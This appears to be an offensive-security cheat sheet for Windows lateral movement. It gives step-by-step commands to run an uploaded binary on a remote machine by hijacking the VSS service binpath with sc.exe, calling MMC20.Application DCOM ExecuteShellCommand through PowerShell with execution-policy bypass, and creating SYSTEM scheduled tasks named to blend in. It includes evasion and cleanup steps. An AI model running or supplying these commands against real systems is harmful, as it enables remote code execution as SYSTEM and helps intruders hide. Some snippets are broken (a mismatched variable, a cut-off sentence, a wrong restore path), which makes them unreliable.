Upload binary to remote machine, modify existing service to point at that binary, start the service, and re-configure the service binpath back to its original value. VSS is a service that works 
great for this technique, but other services can work if they meet the requirements listed in the right column below.


-- sc.exe Remote Execution --

Upload binary to remote machine, modify existing service to point at that binary, start the service, and re-configure the service binpath back to its original value. VSS is a service that works great for this technique, but other services can work if they meet the requirements listed in the right column below.

# Ensure service runs as LocalSystem and log original binary path
sc \\<IP_ADDRESS> qc vss

# Ensure service is currently off
sc \\<IP_ADDRESS> query vss

# Set remote machine binpath to uploaded binary
sc \\<IP_ADDRESS> config vss binpath= "<FILE_PATH>"

# Ensure remote machine service binpath was set correctly
sc \\<IP_ADDRESS> qc vss

# Start service on remote machine
sc \\<IP_ADDRESS> start vss

# Ensure service is off before setting binpath back to original
sc \\<IP_ADDRESS> stop vss

# Set remote machine service binpath back to original
sc \\<IP_ADDRESS> config vss binpath= "<FILE_PATH>"

# Ensure remote machine service binpath was set back correctly
sc \\<IP_ADDRESS> qc vss


-- MMC COM Object --

Upload binary to remote machine system folder and execute via MMC COM execution. Set the proper remote IP and uploaded binary path in the command below and execute via powershell.exe. FILEPATH = full path to target executable to star

Note: Only works against Windows Server Target

powershell -ep bypass -nop -Command 
([activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”<IP_ADDRESS>”))).Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”)

Create 2 Commands

$1 = ([activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”<IP_ADDRESS>”)))
$i.Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”)


-- Remote Schtasks Execution --

Upload binary to remote machine, create scheduled task pointing at that binary, run task, and delete task. Can change “OfficeUpdater” to any task name that blends into tar get system

# Add task
schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>

# Query task verbose
schtasks /query /tn OfficeUpdater /fo list /v /s <IP_ADDRESS>

# Run task
schtasks /run /tn OfficeUpdater /s <IP_ADDRESS>

# Delete task
schtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>
